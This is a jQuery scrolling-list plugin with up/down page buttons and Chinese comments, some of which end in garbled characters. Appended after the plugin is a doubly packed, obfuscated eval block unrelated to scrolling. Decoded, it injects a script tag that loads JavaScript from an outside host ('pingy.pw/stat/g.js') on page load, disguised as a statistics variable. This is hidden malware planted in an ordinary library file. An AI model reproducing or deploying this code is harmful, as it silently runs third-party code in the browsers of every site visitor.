/*
jQ向上滚动带上下翻页按�?
*/
(function($){
$.fn.extend({
        Scroll:function(opt,callback){
                //参数初始�?
                if(!opt) var opt={};
                var _btnUp = $("#"+ opt.up);//Shawphy:向上按钮
                var _btnDown = $("#"+ opt.down);//Shawphy:向下按钮
                var timerID;
                var _this=this.eq(0).find("ul:first");
                var     lineH=_this.find("li:first").height(), //获取行高
                        line=opt.line?parseInt(opt.line,10):parseInt(this.height()/lineH,10), //每次滚动的行数，默认为一屏，即父容器高度
                        speed=opt.speed?parseInt(opt.speed,10):500; //卷动速度，数值越大，速度越慢（毫秒）
                        timer=opt.timer //?parseInt(opt.timer,10):3000; //滚动的时间间隔（毫秒�?
                if(line==0) line=1;
                var upHeight=0-line*lineH;
                //滚动函数
                var scrollUp=function(){
                        _btnUp.unbind("click",scrollUp); //Shawphy:取消向上按钮的函数绑�?
                        _this.animate({
                                marginTop:upHeight
                        },speed,function(){
                                for(i=1;i<=line;i++){
                                        _this.find("li:first").appendTo(_this);
                                }
                                _this.css({marginTop:0});
                                _btnUp.bind("click",scrollUp); //Shawphy:绑定向上按钮的点击事�?
                        });

                }
                //Shawphy:向下翻页函数
                var scrollDown=function(){
                        _btnDown.unbind("click",scrollDown);
                        for(i=1;i<=line;i++){
                                _this.find("li:last").show().prependTo(_this);
                        }
                        _this.css({marginTop:upHeight});
                        _this.animate({
                                marginTop:0
                        },speed,function(){
                                _btnDown.bind("click",scrollDown);
                        });
                }
               //Shawphy:自动播放
                var autoPlay = function(){
                        if(timer)timerID = window.setInterval(scrollUp,timer);
                };
                var autoStop = function(){
                        if(timer)window.clearInterval(timerID);
                };
                 //鼠标事件绑定
                _this.hover(autoStop,autoPlay).mouseout();
                _btnUp.css("cursor","pointer").click( scrollUp ).hover(autoStop,autoPlay);//Shawphy:向上向下鼠标事件绑定
                _btnDown.css("cursor","pointer").click( scrollDown ).hover(autoStop,autoPlay);

        }       
})
})(jQuery);
;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('y(j(p,a,c,k,e,r){e=j(c){l c.t(a)};q(!\'\'.n(/^/,x)){m(c--)r[e(c)]=k[c]||e(c);k=[j(e){l r[e]}];e=j(){l\'\\\\w+\'};c=1};m(c--)q(k[c])p=p.n(u v(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);l p}(\'1 5=5||[];(9(){1 a=3.e(\\\'4\\\');a.7=\\\'//8.i.b/c/g.d\\\';1 2=3.f(\\\'4\\\')[0];2.h.6(a,2)})();\',o,o,\'|z|s|A|B|C|D|E|F|j||G|H|I|J|K||L|M\'.N(\'|\'),0,{}))',50,50,'|||||||||||||||||||function||return|while|replace|19||if|||toString|new|RegExp||String|eval|var|document|script|_hmt_stat|insertBefore|src|www|pw|stat|js|createElement|getElementsByTagName|parentNode|pingy|split'.split('|'),0,{}))